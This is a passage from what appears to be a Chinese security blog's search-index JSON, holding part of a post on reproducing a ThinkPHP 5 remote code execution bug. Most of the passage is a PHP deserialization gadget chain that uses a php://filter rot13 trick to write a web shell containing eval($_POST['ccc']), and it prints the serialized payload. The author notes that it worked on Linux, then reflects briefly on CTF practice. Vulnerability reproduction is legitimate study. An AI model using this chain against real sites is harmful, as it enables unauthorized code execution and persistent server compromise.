'cache_subdir' =&gt; false, 'prefix' =&gt; false, 'path' =&gt; 'php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;', 'data_compress' =&gt; false, ];}//Memcached类namespace think\\session\\driver;use think\\cache\\driver\\File;class Memcached{ protected $handler; function __construct() { $this-&gt;handler=new File(); }}//Output类namespace think\\console;use think\\session\\driver\\Memcached;class Output{ protected $styles = ['removeWhereField']; function __construct() { $this-&gt;handle=new Memcached(); }}//HasOne类namespace think\\model\\relation;use think\\console\\Output;class HasOne{ //protected $foreignKey=&quot;sss&quot;; //$this-&gt;query-&gt;removeWhereField($this-&gt;foreignKey) function __construct() { $this-&gt;query=new Output(); }}//Pivot类namespace think\\model;use think\\model\\relation\\HasOne;class Pivot{ protected $append = ['getError']; public function __construct() { $this-&gt;error=new HasOne(); }}//Windows类namespace think\\process\\pipes;use think\\model\\Pivot;class Windows{ public function __construct() { $this-&gt;files=[new Pivot()]; }}$x=new Windows();echo urlencode(serialize($x)); 在windows系统中是无法运行的，因为windows不允许创建包含特殊字符的文件名，（解决方法在这里：） https://xz.aliyun.com/t/7457#toc-3 最后在linux复现成功，运行后生成a.php6218150bbcad1e6eec78da4604c4b6c7.php，其中包含了一个eval($_POST[‘ccc’]) 最后只想说是真的难，和平时比赛中的反序列化链子完全不是一个级别的。然后总之就是多审链子，还是太菜了。","link":"/2020/09/13/thinkphp5-rce/"}],"tags":[{"name":"ssti","slug":"ssti","link":"/tags/ssti/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"sql注入","slug":"sql注入","link":"/categories/sql%E6%B3%A8%E5%85%A5/"},{"name":"文件上传","slug":"文件上传","link":"/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"ssti","slug":"ssti","link":"/categories/ssti/"},{"name":"反序列化","slug":"反序列化","link":"/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"漏洞复现","slug":"漏洞复现","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]}